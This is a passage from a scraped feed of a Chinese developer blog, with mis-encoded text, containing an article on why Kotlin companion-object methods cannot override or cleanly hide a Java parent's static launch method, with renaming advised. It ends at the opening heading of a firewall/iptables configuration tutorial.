                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Kotlin é‡ä¸Š Java é™æ€æ–¹æ³•ï¼šä¸€ä¸ªå…³äºâ€œé‡å†™â€çš„é™·é˜±ä¸æœ€ä½³å®è·µ</h2>
<p>åœ¨ Android æ—¥å¸¸å¼€å‘ä¸­ï¼ŒKotlin ä¸ Java çš„æ··åˆç¼–ç¨‹å·²æ˜¯å¸¸æ€ã€‚æˆ‘ä»¬äº«å—ç€ Kotlin å¸¦æ¥çš„ç®€æ´ä¸å®‰å…¨ï¼Œä½†ä¸¤ç§è¯­è¨€çš„åº•å±‚å·®å¼‚å¶å°”ä¹Ÿä¼šç»™æˆ‘ä»¬å¸¦æ¥ä¸€äº›æ„æƒ³ä¸åˆ°çš„â€œæƒŠå–œâ€ã€‚ä»Šå¤©ï¼Œæˆ‘ä»¬å°±æ¥å‰–æä¸€ä¸ªåœ¨ç»§æ‰¿å…³ç³»ä¸­ï¼Œç”± Kotlin çš„ <code>companion object</code>ä¸ Java çš„ <code>static</code>æ–¹æ³•å¼•å‘çš„ç»å…¸é™·é˜±ã€‚</p>
<h3 data-id="heading-1">é—®é¢˜çš„èµ·ç‚¹ï¼šä¸€ä¸ªç»§æ‰¿å¼•å‘çš„å›°æƒ‘</h3>
<p>æƒ³è±¡ä¸€ä¸ªå¸¸è§çš„åœºæ™¯ï¼šæˆ‘ä»¬æœ‰ä¸€ä¸ªç”¨ Java ç¼–å†™çš„ã€è®¾è®¡ç²¾è‰¯çš„åŸºç±» <code>BaseActivity</code>ï¼Œå®ƒæä¾›äº†ä¸€ä¸ªé™æ€çš„ <code>launch</code>æ–¹æ³•ï¼Œç”¨äºå°è£…å¤æ‚çš„å¯åŠ¨é€»è¾‘ã€‚</p>
<h4 data-id="heading-2">Java çˆ¶ç±» - BaseActivity.java</h4>
<pre><code class="hljs language-scala" lang="scala">public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BaseActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AppCompatActivity</span> </span>{
    <span class="hljs-comment">// ä¸€ä¸ªé€šç”¨çš„ã€é™æ€çš„å¯åŠ¨æ–¹æ³•</span>
    public static void launch(<span class="hljs-type">Context</span> context, <span class="hljs-type">Class</span>&lt;?&gt; target) {
        <span class="hljs-type">Intent</span> intent = <span class="hljs-keyword">new</span> <span class="hljs-type">Intent</span>(context, target);
        <span class="hljs-comment">// ... å…¶ä»–é€šç”¨çš„å‚æ•°è®¾ç½® ...</span>
        context.startActivity(intent);
    }
}
</code></pre>
<p>ç°åœ¨ï¼Œæˆ‘ä»¬éœ€è¦ç”¨ Kotlin åˆ›å»ºä¸€ä¸ªå­ç±» <code>MyFeatureActivity</code>ï¼Œå®ƒç»§æ‰¿è‡ª <code>BaseActivity</code>ã€‚æˆ‘ä»¬å¸Œæœ› <code>MyFeatureActivity</code>ä¹Ÿèƒ½æœ‰ä¸€ä¸ªè‡ªå·±çš„ <code>launch</code>æ–¹æ³•ï¼Œå¹¶ä¸”è¿™ä¸ªæ–¹æ³•æœ‰ä¸€äº›ç‰¹æ®Šé€»è¾‘ï¼Œæ¯”å¦‚ä¼ é€’ç‰¹å®šçš„å‚æ•°ã€‚</p>
<p>æˆ‘ä»¬çš„ç¬¬ä¸€ååº”å¯èƒ½æ˜¯"é‡å†™"çˆ¶ç±»çš„ <code>launch</code>æ–¹æ³•ã€‚</p>
<h4 data-id="heading-3">Kotlin å­ç±» - MyFeatureActivity.kt</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyFeatureActivity</span> : <span class="hljs-type">BaseActivity</span>() {

    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
        <span class="hljs-comment">// ç›®æ ‡ï¼šåˆ›å»ºä¸€ä¸ªä¸“å±çš„ launch æ–¹æ³•ï¼Œå¹¶"è¦†ç›–"çˆ¶ç±»çš„åŒåæ–¹æ³•</span>
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">launch</span><span class="hljs-params">(context: <span class="hljs-type">Context</span>, specialData: <span class="hljs-type">String</span>)</span></span> {
            <span class="hljs-keyword">val</span> intent = Intent(context, MyFeatureActivity::<span class="hljs-keyword">class</span>.java)
            intent.putExtra(<span class="hljs-string">"SPECIAL_DATA"</span>, specialData)
            context.startActivity(intent)
        }
    }
}
</code></pre>
<p>ä»£ç å†™å®Œï¼Œä¸€åœº"æ··ä¹±"çš„åºå¹•å°±æ­¤æ‹‰å¼€ã€‚</p>
<h3 data-id="heading-4">å›°å¢ƒä¸€ï¼šåŠ ä¸ŠÂ <code>@JvmStatic</code>ï¼Œä¸ºä½•ç¼–è¯‘å¤±è´¥ï¼Ÿ</h3>
<p>ä¸ºäº†è®© Kotlin çš„ <code>companion object</code>æ–¹æ³•èƒ½åƒ Java çš„é™æ€æ–¹æ³•ä¸€æ ·è¢«è°ƒç”¨ï¼ˆå³ <code>ClassName.method()</code>ï¼‰ï¼Œæˆ‘ä»¬é€šå¸¸ä¼šåŠ ä¸Š <code>@JvmStatic</code>æ³¨è§£ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
    <span class="hljs-meta">@JvmStatic</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">launch</span><span class="hljs-params">(context: <span class="hljs-type">Context</span>, specialData: <span class="hljs-type">String</span>)</span></span> {
        <span class="hljs-comment">// ...</span>
    }
}
</code></pre>
<p>æˆ‘ä»¬çš„æƒ³æ³•å¾ˆç›´æ¥ï¼šæ—¢ç„¶çˆ¶ç±»æ˜¯ Java çš„ <code>static</code>æ–¹æ³•ï¼Œé‚£æˆ‘ä¹Ÿåœ¨å­ç±»åˆ›å»ºä¸€ä¸ªå¯¹åº”çš„ Java <code>static</code>æ–¹æ³•ï¼Œè¿™ä¸å°±æ˜¯"é‡å†™"äº†å—ï¼Ÿ</p>
<p><strong>ç»“æœï¼šç¼–è¯‘å¤±è´¥ï¼</strong> â€‹ ç¼–è¯‘å™¨ä¼šæŠ›å‡ºä¸€ä¸ªç±»ä¼¼"Platform declaration clash"çš„é”™è¯¯ã€‚</p>
<h4 data-id="heading-5">åŸå› å‰–æ</h4>
<p>è¿™æ˜¯ä¸¤ç§è¯­è¨€è®¾è®¡å“²å­¦çš„ç¬¬ä¸€æ¬¡ç¢°æ’ã€‚</p>
<ul>
<li><strong>Java ä¸–ç•Œè§‚</strong>ï¼šé™æ€æ–¹æ³•å±äºç±»ï¼Œä¸å±äºå¯¹è±¡å®ä¾‹ã€‚å®ƒä¸èƒ½è¢«é‡å†™ï¼ˆOverrideï¼‰ï¼Œåªèƒ½è¢«éšè—ï¼ˆHideï¼‰ã€‚å½“å­ç±»å®šä¹‰äº†ä¸çˆ¶ç±»ç­¾åå®Œå…¨ç›¸åŒçš„é™æ€æ–¹æ³•æ—¶ï¼Œçˆ¶ç±»çš„æ–¹æ³•å°±è¢«"éšè—"äº†ã€‚</li>
<li><strong>Kotlin ä¸–ç•Œè§‚</strong>ï¼šKotlin çš„è®¾è®¡æ›´åŠ ä¸¥æ ¼å’Œå®‰å…¨ã€‚å®ƒè®¤ä¸ºåœ¨å­ç±»ä¸­å£°æ˜ä¸€ä¸ªä¸çˆ¶ç±»é™æ€æ–¹æ³•ç­¾åå®Œå…¨ç›¸åŒçš„æ–¹æ³•ï¼Œæ˜¯ä¸€ç§æ„å›¾ä¸æ˜ç¡®ä¸”å±é™©çš„æ“ä½œã€‚ä¸ºäº†é˜²æ­¢å¼€å‘è€…é™·å…¥"æˆ‘ä»¥ä¸ºæˆ‘é‡å†™äº†ï¼Œä½†å®é™…ä¸Šæ²¡æœ‰"çš„è®¤çŸ¥è¯¯åŒºï¼ŒKotlin ç¼–è¯‘å™¨é€‰æ‹©åœ¨ç¼–è¯‘æœŸç›´æ¥ç¦æ­¢è¿™ç§è¡Œä¸ºã€‚</li>
</ul>
<h3 data-id="heading-6">å›°å¢ƒäºŒï¼šä¸åŠ Â <code>@JvmStatic</code>ï¼Œä¸ºä½•è¡Œä¸ºä¸ä¸€è‡´ï¼Ÿ</h3>
<p>å¥½å§ï¼Œæ—¢ç„¶ç¼–è¯‘å™¨ä¸è®©ï¼Œé‚£æˆ‘ä»¬å»æ‰ <code>@JvmStatic</code>æ€»è¡Œäº†å§ï¼Ÿ</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">launch</span><span class="hljs-params">(context: <span class="hljs-type">Context</span>, specialData: <span class="hljs-type">String</span>)</span></span> {
        <span class="hljs-comment">// ...</span>
    }
}
</code></pre>
<p>ä»£ç ç¼–è¯‘é€šè¿‡äº†ï¼æˆ‘ä»¬æ¥å°è¯•è°ƒç”¨ä¸€ä¸‹ <code>MyFeatureActivity.launch(...)</code>ã€‚</p>
<p>å¥‡æ€ªçš„ç°è±¡å‘ç”Ÿäº†ï¼š</p>
<p><strong>1. åœ¨å¦ä¸€ä¸ª Kotlin æ–‡ä»¶ä¸­è°ƒç”¨ï¼š</strong></p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// åœ¨ Kotlin ä»£ç ä¸­è°ƒç”¨</span>
MyFeatureActivity.<span class="hljs-built_in">launch</span>(context, <span class="hljs-string">"some_data"</span>)
</code></pre>
<p>æ‰§è¡Œçš„æ˜¯ <code>MyFeatureActivity</code>ä¸­æˆ‘ä»¬æ–°å®šä¹‰çš„ <code>launch</code>æ–¹æ³•ã€‚ä¸€åˆ‡æ­£å¸¸ï¼</p>
<p><strong>2. åœ¨ Java æ–‡ä»¶ä¸­è°ƒç”¨ï¼š</strong></p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// åœ¨ Java ä»£ç ä¸­è°ƒç”¨</span>
MyFeatureActivity.<span class="hljs-built_in">launch</span>(context, MyFeatureActivity.<span class="hljs-keyword">class</span>);
</code></pre>
<p>æ‰§è¡Œçš„ç«Ÿç„¶æ˜¯çˆ¶ç±» <strong>BaseActivity</strong>â€‹ çš„ <code>launch</code>æ–¹æ³•ï¼</p>
<h4 data-id="heading-7">åŸå› å‰–æ</h4>
<p>è¿™æ˜¯ä¸¤ç§è¯­è¨€åº•å±‚å®ç°çš„ç¬¬äºŒæ¬¡ç¢°æ’ã€‚</p>
<ul>
<li><strong>Kotlin çš„è§†è§’</strong>ï¼šå½“åœ¨ Kotlin ä¸­è°ƒç”¨ <code>MyFeatureActivity.launch(...)</code>æ—¶ï¼ŒKotlin ç¼–è¯‘å™¨éå¸¸"æ‡‚"è‡ªå®¶çš„ <code>companion object</code>ã€‚å®ƒçŸ¥é“è¿™ä¸ªè°ƒç”¨åº”è¯¥è¢«è§£æä¸º <code>MyFeatureActivity.Companion.launch(...)</code>ï¼Œå‡†ç¡®åœ°æ‰¾åˆ°äº†å­ç±»ä¸­çš„æ–¹æ³•ã€‚</li>
<li><strong>Java çš„è§†è§’</strong>ï¼šå½“åœ¨ Java ä¸­è°ƒç”¨ <code>MyFeatureActivity.launch(...)</code>æ—¶ï¼ŒJava ç¼–è¯‘å™¨å¯¹ <code>companion object</code>ä¸€æ— æ‰€çŸ¥ã€‚å®ƒåªçœ‹åˆ° <code>MyFeatureActivity</code>ç»§æ‰¿è‡ª <code>BaseActivity</code>ï¼Œå¹¶ä¸” <code>BaseActivity</code>ä¸­å­˜åœ¨ä¸€ä¸ªåˆæ³•çš„ã€å…¬å¼€çš„ <code>public static void launch(...)</code>æ–¹æ³•ã€‚äºæ˜¯ï¼Œéµå¾ªç»§æ‰¿è§„åˆ™ï¼Œå®ƒç›´æ¥è°ƒç”¨äº†çˆ¶ç±»ä¸­çš„é™æ€æ–¹æ³•ã€‚</li>
</ul>
<p>è¿™å°±å¯¼è‡´äº†ä¸€ä¸ªæå…¶éšè”½ä¸”å±é™©çš„ Bugï¼š<strong>åŒä¸€ä¸ªæ–¹æ³•è°ƒç”¨ï¼Œåœ¨ä¸åŒçš„è¯­è¨€ç¯å¢ƒä¸­ï¼Œäº§ç”Ÿäº†æˆªç„¶ä¸åŒçš„è¡Œä¸ºï¼</strong></p>
<h3 data-id="heading-8">æœ€ä½³å®è·µï¼šæ”¾å¼ƒæ‰§å¿µï¼Œæ‹¥æŠ±æ¸…æ™°</h3>
<p>é¢å¯¹è¿™ç§"åŠ ä¸Šç¼–è¯‘ä¸è¿‡ï¼Œä¸åŠ è¡Œä¸ºä¸ä¸€"çš„ä¸¤éš¾å±€é¢ï¼Œæˆ‘ä»¬åº”è¯¥æ„è¯†åˆ°ï¼Œ"é‡å†™"æˆ–"éšè—"çˆ¶ç±»çš„é™æ€æ–¹æ³•ä»ä¸€å¼€å§‹å°±æ˜¯ä¸€æ¡å´å²–çš„è·¯ã€‚</p>
<p><strong>æœ€ä½³å®è·µåªæœ‰ä¸€ä¸ªï¼šé‡å‘½åã€‚</strong></p>
<p>ä¸ºå­ç±»çš„æ–¹æ³•èµ·ä¸€ä¸ªå…¨æ–°çš„ã€ä¸ä¼šäº§ç”Ÿä»»ä½•æ­§ä¹‰çš„åå­—ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyFeatureActivity</span> : <span class="hljs-type">BaseActivity</span>() {

    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
        <span class="hljs-comment">// ä½¿ç”¨ä¸€ä¸ªå…¨æ–°çš„ã€æ˜ç¡®çš„åå­—</span>
        <span class="hljs-meta">@JvmStatic</span> <span class="hljs-comment">// åŠ ä¸Š JvmStaticï¼Œæ–¹ä¾¿ Java è°ƒç”¨</span>
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">start</span><span class="hljs-params">(context: <span class="hljs-type">Context</span>, specialData: <span class="hljs-type">String</span>)</span></span> {
            <span class="hljs-keyword">val</span> intent = Intent(context, MyFeatureActivity::<span class="hljs-keyword">class</span>.java)
            intent.putExtra(<span class="hljs-string">"SPECIAL_DATA"</span>, specialData)
            <span class="hljs-comment">// ç”šè‡³å¯ä»¥å¤ç”¨çˆ¶ç±»çš„é€šç”¨é€»è¾‘</span>
            <span class="hljs-comment">// super.launch(context, MyFeatureActivity::class.java) // é”™è¯¯ï¼ä¸èƒ½é€šè¿‡ super è°ƒç”¨ static</span>
            context.startActivity(intent)
        }
    }
}
</code></pre>
<p>è¿™æ ·åšçš„å¥½å¤„æ˜¾è€Œæ˜“è§ï¼š</p>
<ol>
<li><strong>æ„å›¾æ˜ç¡®</strong>ï¼š<code>start</code>è¿™ä¸ªåå­—æ¸…æ¥šåœ°è¡¨æ˜äº†è¿™æ˜¯ <code>MyFeatureActivity</code>ä¸“å±çš„å¯åŠ¨æ–¹æ³•ã€‚</li>
<li><strong>è¡Œä¸ºç»Ÿä¸€</strong>ï¼šæ— è®ºæ˜¯åœ¨ Java è¿˜æ˜¯ Kotlin ä¸­ï¼Œè°ƒç”¨ <code>MyFeatureActivity.start(...)</code>éƒ½åªä¼šæ‰§è¡Œè¿™ä¸€ä¸ªæ–¹æ³•ï¼Œç»æ— äºŒä¹‰ã€‚</li>
<li><strong>å®‰å…¨å¯é </strong>ï¼šå½»åº•æ ¹é™¤äº†å› è¯­è¨€å·®å¼‚å¯¼è‡´çš„è°ƒç”¨æ··ä¹±é—®é¢˜ã€‚</li>
</ol>
<h3 data-id="heading-9">ç»“è¯­</h3>
<p>è¿™ä¸ªå°å°çš„æ¡ˆä¾‹æ·±åˆ»åœ°æé†’æˆ‘ä»¬ï¼šåœ¨äº«å— Kotlin ä¸ Java æ— ç¼äº’æ“ä½œæ€§çš„åŒæ—¶ï¼Œæˆ‘ä»¬å¿…é¡»å¯¹å…¶åº•å±‚çš„å®ç°å·®å¼‚ä¿æŒæ•¬ç•ã€‚è¯•å›¾ç”¨ä¸€ç§è¯­è¨€çš„ç‰¹æ€§å»"å¼ºè¡Œè§£é‡Š"å¦ä¸€ç§è¯­è¨€ï¼Œå¾€å¾€ä¼šèµ°è¿›æ­»èƒ¡åŒã€‚</p>
<p>å½“é‡åˆ°ç±»ä¼¼"é™æ€æ–¹æ³•ç»§æ‰¿"è¿™ç±»æ¨¡ç³Šåœ°å¸¦æ—¶ï¼Œé€‰æ‹©æœ€æ¸…æ™°ã€æœ€æ²¡æœ‰æ­§ä¹‰çš„æ–¹æ¡ˆâ€”â€”æ¯”å¦‚é‡å‘½åâ€”â€”æ°¸è¿œæ˜¯é€šå¾€é«˜è´¨é‡ã€å¯ç»´æŠ¤ä»£ç çš„åº·åº„å¤§é“ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[é˜²ç«å¢™é«˜çº§é…ç½®å®Œæ•´æ•™ç¨‹ï¼šç«¯å£æ˜ å°„+è®¿é—®æ§åˆ¶ç­–ç•¥+iptablesè§„åˆ™ç¼–å†™]]></title>    <link>https://juejin.cn/post/7576978338754625586</link>    <guid>https://juejin.cn/post/7576978338754625586</guid>    <pubDate>2025-11-27T06:16:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576978338754625586" data-draft-id="7576918517238726706" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="é˜²ç«å¢™é«˜çº§é…ç½®å®Œæ•´æ•™ç¨‹ï¼šç«¯å£æ˜ å°„+è®¿é—®æ§åˆ¶ç­–ç•¥+iptablesè§„åˆ™ç¼–å†™"/> <meta itemprop="keywords" content="è¿ç»´"/> <meta itemprop="datePublished" content="2025-11-27T06:16:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸Šç­æ—¥å¸¸æ‘¸é±¼"/> <meta itemprop="url" content="https://juejin.cn/user/1197792767524060"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            é˜²ç«å¢™é«˜çº§é…ç½®å®Œæ•´æ•™ç¨‹ï¼šç«¯å£æ˜ å°„+è®¿é—®æ§åˆ¶ç­–ç•¥+iptablesè§„åˆ™ç¼–å†™
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1197792767524060/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸Šç­æ—¥å¸¸æ‘¸é±¼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T06:16:45.000Z" title="Thu Nov 27 2025 06:16:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">ä¸€ã€é˜²ç«å¢™é«˜çº§é…ç½®æ ¸å¿ƒæ¦‚å¿µï¼ˆæ–°æ‰‹å¿…çœ‹ï¼‰</h3>
